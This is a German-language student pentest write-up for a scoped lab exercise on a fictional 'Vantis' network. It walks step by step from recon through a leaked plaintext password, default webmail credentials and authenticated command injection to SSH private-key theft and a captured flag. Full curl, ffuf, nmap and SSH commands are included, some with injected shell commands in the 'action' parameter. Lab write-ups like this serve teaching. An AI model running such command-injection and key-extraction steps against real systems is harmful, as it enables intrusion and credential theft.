CYS II – Pentest Dokumentation – Short Version – Vantis Group
==================================================================

:Projekt: CYS II – Pentest Dokumentation – Short Version – Vantis Group
:Autor: Haiko Nuding
:Klasse: H25b
:Status: Abgeschlossen
:Datum: 07.09.2026
:Version: Short Version

.. note::

   **Zweck dieser Short Version**

   Diese Fassung enthält ausschliesslich den erfolgreichen und reproduzierbaren
   Angriffspfad bis zu Flag 1. Verworfene Hypothesen, fehlgeschlagene Tests und
   alternative Angriffspfade wurden bewusst entfernt.

   FullVersion: https://haiko-nuding.github.io/HF-Sphinx-Documentation/Semester-04/CYSII/flag_01.html

.. note::

   **Assessment-Kontext**

   * **Zielbereich (In Scope):** ``10.47.64.0/18``
   * **Ausgeschlossenes Segment (Out of Scope):** ``10.145.37.0/24``
   * **Eigene Quell-IP:** ``10.145.37.123`` (Kali VM)
   * **Ziel:** Identifikation und Ausnutzung einer reproduzierbaren Angriffskette innerhalb des definierten Scopes.
   * **Einschränkungen:** Keine DoS-Angriffe, keine absichtliche Beschädigung oder Löschung und keine Angriffe auf Netzwerk-, Management- oder Orchestrierungsinfrastruktur.

.. raw:: pdf

   PageBreak

.. rubric:: Inhaltsverzeichnis

.. contents::
   :local:
   :depth: 2
   :backlinks: top


===========================================
Kapitel 1 – Kurzfassung des Angriffspfads
===========================================

Der erfolgreiche Angriffspfad führte von der Identifikation des Zielhosts über
ein offengelegtes Passwort und einen schwach geschützten Webmail-Zugang bis zu
einer authentifizierten Command Injection. Über diese wurde ein nur lokal
erreichbarer Dienst angesprochen, ein SSH Private Key extrahiert und
anschliessend Flag 1 auf ``web01.vantis.internal`` gelesen.

Der erfolgreiche Pfad war:

.. code-block:: text

   Host- und Service-Discovery
        |
        v
   10.47.84.110 / web01.vantis.internal
        |
        v
   Virtual Host Discovery
        |
        +--> dev.vantis.internal
        +--> deploy.vantis.internal
        +--> mail.vantis.internal
        |
        v
   dev.vantis.internal
   /staging/internal/mail/backups/deploy_notes.txt
        |
        v
   Klartext-Passwort
   GoldSchafHirsch593
        |
        v
   mail.vantis.internal
   Default Credentials: vantis : vantis
        |
        v
   Inbox nennt Benutzer malik.da-costa
        |
        v
   Credential-Korrelation
   malik.da-costa : GoldSchafHirsch593
        |
        v
   Login auf deploy.vantis.internal
        |
        v
   /diagnostics
   Command Injection über "action"
        |
        v
   Befehlsausführung als svc-vantis
        |
        v
   Zugriff auf http://127.0.0.1:8022/
        |
        v
   Personal Key Vault
        |
        v
   SSH Private Key id_ed25519
        |
        v
   SSH als malik.da-costa auf web01
        |
        v
   /home/malik.da-costa/user.txt
        |
        v
   Flag 1


=========================================
Kapitel 2 – Zielhost und Angriffsfläche
=========================================

Host- und Service-Discovery
---------------------------

Die Reconnaissance identifizierte ``10.47.84.110`` als zentralen Zielhost.
Ein gezielter Service-Scan bestätigte SSH, nginx und einen Gunicorn-Dienst auf
Port ``8022/tcp``.

**Befehl:**

.. code-block:: bash

   nmap -sV -p22,80,8022 10.47.84.110

**Validierter Stand:**

.. code-block:: text

   22/tcp   open   ssh    OpenSSH 10.2p1 Ubuntu
   80/tcp   open   http   nginx 1.28.3
   8022/tcp open   http   Gunicorn

**Hostname:**

``web01.vantis.internal``

.. figure:: ../../_static/img/sem4/cys_01.PNG
   :alt: Nmap-Service-Scan des Zielhosts web01.vantis.internal mit offenen Ports 22, 80 und 8022
   :align: center
   :width: 100%

Virtual Host Discovery
----------------------

Die Webanalyse zeigte mehrere namensbasierte Anwendungen auf demselben Host.
Mit ``ffuf`` wurden die relevanten Virtual Hosts identifiziert.

**Befehl:**

.. code-block:: bash

   ffuf \
     -u http://10.47.84.110/ \
     -H "Host: FUZZ.vantis.internal" \
     -w /usr/share/wordlists/dirb/common.txt

**Relevante Hosts:**

* ``dev.vantis.internal``
* ``deploy.vantis.internal``
* ``mail.vantis.internal``

Diese drei Anwendungen bildeten die Grundlage des erfolgreichen Angriffspfads.


=========================================
Kapitel 3 – Klartext-Passwort auf dev
=========================================

Sensitives Backup-Artefakt
--------------------------

Auf ``dev.vantis.internal`` war unterhalb der Staging-Struktur ein Directory
Listing erreichbar. Darin befand sich die Datei:

``/staging/internal/mail/backups/deploy_notes.txt``

Die Datei wurde direkt abgerufen.

**Befehl:**

.. code-block:: bash

   curl -s \
     -H 'Host: dev.vantis.internal' \
     http://10.47.84.110/staging/internal/mail/backups/deploy_notes.txt

**Inhalt:**

.. code-block:: text

   # deploy notes - remove before go-live
   portal login: GoldSchafHirsch593
   TODO: change after initial login!

.. figure:: ../../_static/img/sem4/cys_02.PNG
   :alt: Auslesen der Datei deploy_notes.txt mit dem im Klartext gespeicherten Portal-Passwort
   :align: center
   :width: 100%

**Erkenntnis:**

Das Passwort ``GoldSchafHirsch593`` war damit bekannt. Die Datei enthielt
jedoch keinen Benutzernamen, weshalb zunächst noch der passende Account
ermittelt werden musste.


==============================================
Kapitel 4 – Webmail und Credential-Korrelation
==============================================

Schwacher Webmail-Zugang
------------------------

``mail.vantis.internal`` identifizierte sich als
``VantisMail Webclient v2.3.1-legacy``. Ein begründeter Test mit
Default Credentials war erfolgreich.

**Befehl:**

.. code-block:: bash

   curl -i -c /tmp/mail.jar \
     -H 'Host: mail.vantis.internal' \
     --data-urlencode 'username=vantis' \
     --data-urlencode 'password=vantis' \
     http://10.47.84.110/login

**Relevantes Ergebnis:**

.. code-block:: text

   HTTP/1.1 302 FOUND
   Location: /inbox
   Set-Cookie: session=...

Damit waren die Credentials ``vantis:vantis`` für den internen Webmail-Dienst
bestätigt.

Webmail Inbox
-------------

Mit der authentifizierten Session wurde die Inbox abgerufen.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/mail.jar \
     -H 'Host: mail.vantis.internal' \
     http://10.47.84.110/inbox

**Relevante Nachricht:**

.. code-block:: text

   From: admin@vantis.internal
   To: malik.da-costa@vantis.internal
   Subject: Portal-Zugang
   Date: 13.08.2026 17:32

   Hoi Malik

   Habe dein Passwort fürs Portal auf dev abgelegt,
   kannst es dort nachschauen.
   Bitte gleich nach dem ersten Login ändern.

   Liebe Grüsse
   Admin

Die Nachricht lieferte den fehlenden Benutzernamen:

``malik.da-costa``

Credential-Korrelation
----------------------

Durch die Kombination aus Webmail-Nachricht und dem zuvor gefundenen
``deploy_notes.txt`` ergaben sich vollständige Portal-Credentials:

.. code-block:: text

   Username: malik.da-costa
   Password: GoldSchafHirsch593


================================================
Kapitel 5 – Deploy Portal und Command Injection
================================================

Erfolgreicher Login
-------------------

Die korrelierten Credentials wurden gegen ``deploy.vantis.internal`` verwendet.

**Befehl:**

.. code-block:: bash

   curl -i -c /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode 'username=malik.da-costa' \
     --data-urlencode 'password=GoldSchafHirsch593' \
     http://10.47.84.110/login

Der Login war erfolgreich. Die authentifizierte Session wurde unter
``/tmp/deploy.jar`` gespeichert.

Authenticated Command Injection
-------------------------------

Nach der Authentifizierung war ``/diagnostics`` erreichbar. Der Parameter
``action`` konnte mit einem frei gewählten Betriebssystembefehl belegt werden.
Zum kontrollierten Nachweis wurde ``id`` verwendet.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode 'action=id' \
     http://10.47.84.110/diagnostics

.. figure:: ../../_static/img/sem4/cys_03.PNG
   :alt: Erfolgreicher Nachweis der authentifizierten Command Injection mit Befehlsausführung als svc-vantis
   :align: center
   :width: 100%

**Relevante Ausgabe:**

.. code-block:: text

   uid=999(svc-vantis) gid=983(svc-vantis) groups=983(svc-vantis)

Damit war eine authentifizierte OS Command Injection mit Befehlsausführung als
``svc-vantis`` bestätigt.


==========================================
Kapitel 6 – Interner Pivot und SSH-Zugriff
==========================================

Interner Zugriff auf Port 8022
------------------------------

Port ``8022/tcp`` war von der Kali-VM direkt nur eingeschränkt erreichbar.
Durch die Command Injection konnte der Dienst jedoch direkt von
``127.0.0.1`` des Zielhosts angesprochen werden.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode \
       'action=curl -s http://127.0.0.1:8022/' \
     http://10.47.84.110/diagnostics

**Relevante Antwort:**

.. code-block:: text

   Personal Key Vault

   authorized_keys
   id_ed25519
   id_ed25519.pub

Damit war ein nur lokal erreichbarer ``Personal Key Vault`` zugänglich.

Extraktion des SSH Private Keys
-------------------------------

Der private SSH-Schlüssel wurde über den internen Dienst abgerufen.

**Befehl:**

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode \
       'action=curl -s http://127.0.0.1:8022/id_ed25519' \
     http://10.47.84.110/diagnostics

**Antwort:**

.. code-block:: text

   -----BEGIN OPENSSH PRIVATE KEY-----
   [...]
   -----END OPENSSH PRIVATE KEY-----

Der vollständige Schlüssel wird aus Sicherheits- und Dokumentationsgründen
nicht im Bericht wiedergegeben.

Für die lokale Verwendung wurde der Schlüssel aus der HTML-Antwort extrahiert:

.. code-block:: bash

   curl -s -b /tmp/deploy.jar \
     -H 'Host: deploy.vantis.internal' \
     --data-urlencode \
       'action=curl -s http://127.0.0.1:8022/id_ed25519' \
     http://10.47.84.110/diagnostics \
   | sed -n \
       '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' \
   | sed \
       -e 's/^.*-----BEGIN OPENSSH PRIVATE KEY-----/-----BEGIN OPENSSH PRIVATE KEY-----/' \
       -e 's/-----END OPENSSH PRIVATE KEY-----.*$/-----END OPENSSH PRIVATE KEY-----/' \
   > /tmp/malik_key

Anschliessend wurden die Dateiberechtigungen gesetzt:

.. code-block:: bash

   chmod 600 /tmp/malik_key

SSH-Zugang auf web01
--------------------

Der extrahierte Private Key ermöglichte den SSH-Zugang als
``malik.da-costa``.

**Befehl:**

.. code-block:: bash

   ssh \
     -i /tmp/malik_key \
     -o IdentitiesOnly=yes \
     malik.da-costa@10.47.84.110

Der SSH-Login war erfolgreich.

Validierung des Zugriffs
------------------------

Nach der Anmeldung wurden Benutzer, Host und Arbeitsverzeichnis kontrolliert.

**Befehle:**

.. code-block:: bash

   id
   hostname
   pwd
   ls -la ~

**Relevante Ausgabe:**

.. code-block:: text

   uid=1000(malik.da-costa)
   gid=1000(malik.da-costa)
   groups=1000(malik.da-costa),27(sudo)

   web01.vantis.internal

   /home/malik.da-costa

.. figure:: ../../_static/img/sem4/cys_04.PNG
   :alt: Validierung des SSH-Zugriffs auf web01.vantis.internal als Benutzer malik.da-costa
   :align: center
   :width: 100%

Im Home-Verzeichnis befand sich unter anderem:

.. code-block:: text

   -r-------- 1 malik.da-costa malik.da-costa 102 Sep 3 18:23 user.txt

Damit war ein authentifizierter Shell-Zugang auf
``web01.vantis.internal`` als ``malik.da-costa`` erreicht.


==========================
Kapitel 7 – Zielerreichung
==========================

Flag 1
------

Die Flag-Datei befand sich unter:

``/home/malik.da-costa/user.txt``

**Befehl:**

.. code-block:: bash

   cat ~/user.txt

.. figure:: ../../_static/img/sem4/cys_05.PNG
   :alt: Auslesen von user.txt auf web01.vantis.internal und erfolgreicher Fund von Flag 1
   :align: center
   :width: 100%

**Ergebnis:**

.. code-block:: text

   CYSII{56d5e585c1abf4c677706f18d09f641b210c7942351c4625b9f5774d9c93e04a525335cff1d15fc6a78f3c9b6dd2a9}

.. note::

   **Zugriffslevel**

   * Benutzer: ``malik.da-costa``
   * UID: ``1000``
   * Gruppen: ``malik.da-costa``, ``sudo``
   * Host: ``web01.vantis.internal``
   * Ziel-IP: ``10.47.84.110``

Validierung auf der Plattform
-----------------------------

Die gefundene Flag wurde auf der CYS-II-Lab-Plattform eingereicht und als
gültig bestätigt.

.. figure:: ../../_static/img/sem4/cys_06.PNG
   :alt: Erfolgreiche Einreichung und Validierung von Flag 1 auf der CYS II Lab Plattform
   :align: center
   :width: 100%


====================================
Kapitel 8 – Ergebnis und Kurzfazit
====================================

Flag 1 wurde über einen vollständig reproduzierbaren Angriffspfad erreicht.

Die entscheidenden Schwachstellen und Fehlkonfigurationen waren:

* Offen zugängliches sensibles Backup-Artefakt auf ``dev.vantis.internal``.
* Klartext-Passwort in ``deploy_notes.txt``.
* Schwache Default Credentials auf dem internen Webmail-Dienst.
* Offenlegung des zugehörigen Portal-Benutzernamens über eine Webmail-Nachricht.
* Authenticated OS Command Injection im Deploy Portal.
* Erreichbarkeit eines intern beschränkten Key Vaults über die Command Injection.
* Bereitstellung eines privaten SSH-Schlüssels über den internen Dienst.
* Erfolgreicher SSH-Zugang als ``malik.da-costa``.

Die erfolgreiche Kette lässt sich damit auf folgenden Kern reduzieren:

.. code-block:: text

   Recon
     -> dev.vantis.internal
     -> Klartext-Passwort
     -> Webmail Default Credentials
     -> Benutzername malik.da-costa
     -> Deploy Login
     -> Command Injection
     -> localhost:8022
     -> SSH Private Key
     -> SSH auf web01
     -> user.txt
     -> Flag 1
